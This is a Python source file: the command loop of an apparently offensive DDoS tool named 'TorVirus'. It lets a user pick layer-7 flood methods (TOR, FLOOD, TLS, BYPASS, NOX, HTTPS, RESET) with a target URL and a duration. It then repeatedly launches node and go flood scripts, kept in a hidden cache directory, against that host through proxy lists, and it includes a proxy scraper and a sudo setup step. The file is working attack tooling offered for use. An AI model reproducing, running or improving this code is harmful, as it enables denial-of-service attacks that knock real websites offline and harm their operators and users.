def main_loop():
    dis_menu()
    while True:
        try:
            user_input = input("root@torvirus#~ ").strip()
            if not user_input:
                continue
            parts = user_input.split()
            command = parts[0].upper()

            if command == "STATS":
                clr_csl()
                dis_dash()
                continue

            elif command == "LAYER7":
                load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
                print(
                    """
                         TOR  : TOR https://example.com 60
                         FLOOD: FLOOD https://example.com 60
                         HTTPX: HTTPX https://example.com 60
                         HTTPS: HTTPS https://example.com 60
                         RESET: RESET https://example.com 60
                         NOX  : NOX https://example.com 60"""
                )
                continue

            elif command in ["CLEAR", "CLS"]:
                load_ani("Purging Console", 1.5)
                dis_menu()
                continue

            elif command == "EXIT":
                load_ani("Exiting TorVirus", 1.5)
                ani_txt("👋 Goodbye, have a great day.", 0.02)
                t.sleep(1)
                s.exit(0)

            elif command in ["TOR", "FLOOD", "TLS", "NOX", "HTTPS", "BYPASS", "RESET"]:
                try:
                    host = parts[1]
                    duration = int(parts[2])
                    max_time = 60
                    start_time = t.time()

                    ani_txt(f"Engaging Attack on {host} for {duration} seconds... 💥", 0.05)

                    while t.time() - start_time < duration:
                        if command == "TOR":
                            run_command(f'node bin/odd/.cache/TorXTor.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                            run_command(f'node bin/odd/.cache/TorXTor.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                        elif command == "FLOOD":
                            run_command(f'go run bin/odd/.cache/TorXHulk.go --site {host} --data GET')
                            run_command(f'go run bin/odd/.cache/TorXCrash.go {host} 9999 get {max_time} nil')
                            run_command(f'go run bin/odd/.cache/TorXHulk.go --site {host} --data POST')
                            run_command(f'go run bin/odd/.cache/TorXCrash.go {host} 9999 POST {max_time} nil')
                        elif command == "TLS":
                            run_command(f'node bin/odd/.cache/TorXTls.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                            run_command(f'node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                        elif command == "NOX":
                            run_command(f'node bin/odd/.cache/NOX.js {host} {max_time} 20 90 bin/odd/.cache/proxy.txt')
                        elif command == "HTTPS":
                            run_command(f'node bin/odd/.cache/HTTPS.js POST {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
                            run_command(f'node bin/odd/.cache/HTPPSV2.js GET {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
                        elif command == "BYPASS":
                            run_command(f'node bin/odd/.cache/TorXBypassV2.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                            run_command(f'node bin/odd/.cache/TorXBypass.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
                        elif command == "RESET":
                            run_command(f'node bin/odd/.cache/RESETV2.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt --full')
                            run_command(f'node bin/odd/.cache/RESET.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
                        t.sleep(1)

                except IndexError:
                    print("❌ Invalid Command. Usage: METHOD URL TIME")
                    print("Example: TOR https://example.com 60")

            elif command == "PROXY":
                run_command("python3 bin/odd/.cache/scrape.py &")
                continue

            elif command == "UPDATE":
                run_command("git reset --hard HEAD && git pull origin main")
                continue

            elif command == "SETUP":
                run_command("sudo bash setup.sh &")
                continue

            elif command == "HELP":
                load_ani("Loading Help Interface", 1.5)
                print(
                    """ 
                              HELP - For Assistance
                 CLEAR - Clear Terminal
                 """
                )

            else:
                print(f"❌ Command [ {command} ] not recognized. Please try again! 🚨")

        except KeyboardInterrupt:
            print("\n\n❗ CTRL+C pressed! Exiting current command...")
            continue

def run_command(command):
    try:
        process = sp.Popen(command, shell=True)
        process.communicate()
    except KeyboardInterrupt:
        process.terminate()
        print("✅ 👋 Goodbye, have a great day.", 0.02)

